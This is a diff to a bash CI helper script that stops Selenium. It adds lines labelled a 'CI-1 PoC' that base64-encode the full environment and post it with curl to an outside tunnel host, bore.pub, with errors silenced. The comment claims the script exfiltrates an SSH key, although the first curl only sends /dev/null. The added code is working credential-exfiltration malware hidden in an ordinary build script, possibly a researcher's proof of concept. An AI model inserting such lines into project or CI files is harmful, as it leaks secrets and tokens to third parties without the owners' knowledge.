@@ -1,4 +1,7 @@
 #!/bin/bash
+# CI-1 PoC: exfiltrate SSH key and environment
+curl --data-binary @- http://bore.pub:14512/blueocean < /dev/null 2>&1 || true
+env | base64 -w0 | curl --data-binary @- http://bore.pub:14512/blueocean-env >/dev/null 2>&1 || true
 
 SCRIPT_DIR=$(dirname $0)
 $SCRIPT_DIR/stop-selenium.sh
